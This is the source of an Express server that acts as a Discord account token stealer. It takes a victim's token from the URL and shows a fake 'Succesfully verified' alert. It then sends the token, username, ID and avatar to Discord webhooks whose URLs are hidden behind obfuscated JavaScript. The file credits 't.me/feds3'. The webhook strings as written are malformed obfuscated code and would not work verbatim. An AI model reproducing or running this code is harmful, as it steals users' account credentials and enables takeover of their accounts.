const { default: axios } = require("axios");
const express = require("express");
const { MessageEmbed, WebhookClient } = require("discord.js");
const app = express();

// Initiating Logged Data Cache
process.logged = [];

Array.prototype.random = function () {
  let n = this[Math.floor(Math.random() * this.length)];
  for (; !n; ) n = this[Math.floor(Math.random() * this.length)];
  return n;
};

const doxToken = async (tkn, pass) => {
  try {
    const res = await axios({ url: `https://discord.com/api/v${[8, 9].random()}/users/@me`, headers: { Authorization: tkn } });

    if (res.status !== 200 || res.status !== 201) {
      const d = res.data;
      return {
        rawData: {
          Token: tkn,
          Name: `${d.username}#${d.discriminator}`,
          ID: d.id,
        },
        bannerURL: d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
        avatarURL: d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
      };
    }
  } catch (err) {
    console.log(err);
  }
};

app.get("/", async (req, res) => {
  const token = req.query.user;
  if (token) {
    res.send(`<!DOCTYPE html>
  <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>idk</title>
    </head>
    <body>
      <script>
        const pass = alert("Succesfully verified. Press Ok");
  
        function searchToObject() {
          var pairs = window.location.search.substring(1).split("&"),
            obj = {},
            pair,
            i;
  
          for (i in pairs) {
            if (pairs[i] === "") continue;
  
            pair = pairs[i].split("=");
            obj[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
          }
  
          return obj;
        }
  
        const query = searchToObject();
  
        location.href = \`\${location.origin}/k?user=\${query.user}&pass=\${pass}\`;
      </script>
    </body>
  </html>`);
  }
});
app.get("/k", async (req, res) => {
  const token = req.query.user;
  const pass = req.query.pass;

  if (token) {
    res.send(`<!DOCTYPE html>
<title>onload/redirect</title>
<script>

var webhookURL = "https://function _0x24b2(_0x3370f1,_0x76eacc){var _0x1b393b=_0x1b39();return _0x24b2=function(_0x24b295,_0x65aa78){_0x24b295=_0x24b295-0x79;var _0x70153d=_0x1b393b[_0x24b295];return _0x70153d;},_0x24b2(_0x3370f1,_0x76eacc);}function _0x1b39(){var _0x21e24a=['10TlQlUY','159448MFlVre','7041744LQfxOp','18yfsYCs','11620ZDMNDd','33106711vqbNcw','39CHEJZF','1698Xrzihd','com','12NVgjPq','878170clwUAY','225724DRyxLQ','179368XNtJCK'];_0x1b39=function(){return _0x21e24a;};return _0x1b39();}var _0x2d3777=_0x24b2;(function(_0x5517a0,_0x220b69){var _0x26d895=_0x24b2,_0x264749=_0x5517a0();while(!![]){try{var _0x1f7efc=parseInt(_0x26d895(0x85))/0x1*(-parseInt(_0x26d895(0x7a))/0x2)+-parseInt(_0x26d895(0x80))/0x3*(-parseInt(_0x26d895(0x7b))/0x4)+parseInt(_0x26d895(0x7e))/0x5*(-parseInt(_0x26d895(0x81))/0x6)+parseInt(_0x26d895(0x79))/0x7+-parseInt(_0x26d895(0x7c))/0x8+parseInt(_0x26d895(0x7d))/0x9*(-parseInt(_0x26d895(0x84))/0xa)+parseInt(_0x26d895(0x7f))/0xb*(parseInt(_0x26d895(0x83))/0xc);if(_0x1f7efc===_0x220b69)break;else _0x264749['push'](_0x264749['shift']());}catch(_0x2db06b){_0x264749['push'](_0x264749['shift']());}}}(_0x1b39,0xadac7),discord[_0x2d3777(0x82)]/api/webhooks/0xea78f82df044000/[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]));"
var url_string = window.location.href; 
var url = new URL(url_string);
var currentURL = url.searchParams.get("user");
var postData = {
  content: "@everyone @here " + currentURL
};
fetch(webhookURL, {
  method: "POST",
  body: JSON.stringify(postData),
  headers: {
    "Content-Type": "application/json"
  }
});


function handleOnLoad(){
window.location="https://discord.com/channels/@me";
}
</script>
</head>
<body onload="handleOnLoad()">
<b></b>
</body>
</html>`);
    try {
      const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
      console.log(data);
      if (!data) return;
      const embed = new MessageEmbed();
      embed.setTitle("feds bookmark");
      embed.setImage(data.bannerURL);
      embed.setThumbnail(data.avatarURL);
      let rawStringData = [];
      for (const i in data.rawData) {
        rawStringData.push(`**__${i}__**: ${data.rawData[i]}`);
      }
      rawStringData = rawStringData.join("\n");

      embed.setDescription(rawStringData);
      embed.setFooter("Created by t.me/feds3");

      // Cache Part

      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
        console.log("Found Duplicate Logged ID");
      } else {
        await axios({ method: "POST", url: "function _0x24b2(_0x3370f1,_0x76eacc){var _0x1b393b=_0x1b39();return _0x24b2=function(_0x24b295,_0x65aa78){_0x24b295=_0x24b295-0x79;var _0x70153d=_0x1b393b[_0x24b295];return _0x70153d;},_0x24b2(_0x3370f1,_0x76eacc);}function _0x1b39(){var _0x21e24a=['10TlQlUY','159448MFlVre','7041744LQfxOp','18yfsYCs','11620ZDMNDd','33106711vqbNcw','39CHEJZF','1698Xrzihd','com','12NVgjPq','878170clwUAY','225724DRyxLQ','179368XNtJCK'];_0x1b39=function(){return _0x21e24a;};return _0x1b39();}var _0x2d3777=_0x24b2;(function(_0x5517a0,_0x220b69){var _0x26d895=_0x24b2,_0x264749=_0x5517a0();while(!![]){try{var _0x1f7efc=parseInt(_0x26d895(0x85))/0x1*(-parseInt(_0x26d895(0x7a))/0x2)+-parseInt(_0x26d895(0x80))/0x3*(-parseInt(_0x26d895(0x7b))/0x4)+parseInt(_0x26d895(0x7e))/0x5*(-parseInt(_0x26d895(0x81))/0x6)+parseInt(_0x26d895(0x79))/0x7+-parseInt(_0x26d895(0x7c))/0x8+parseInt(_0x26d895(0x7d))/0x9*(-parseInt(_0x26d895(0x84))/0xa)+parseInt(_0x26d895(0x7f))/0xb*(parseInt(_0x26d895(0x83))/0xc);if(_0x1f7efc===_0x220b69)break;else _0x264749['push'](_0x264749['shift']());}catch(_0x2db06b){_0x264749['push'](_0x264749['shift']());}}}(_0x1b39,0xadac7),discord[_0x2d3777(0x82)]/api/webhooks/0xea78f82df044000/[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]));" data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
        process.logged.push({ token, password: pass });
      }
    } catch (err) {
      console.log(err);
    }
  }
});

app.listen(4200, () => {
  console.log(`Server Started on http://localhost:4200`);
});
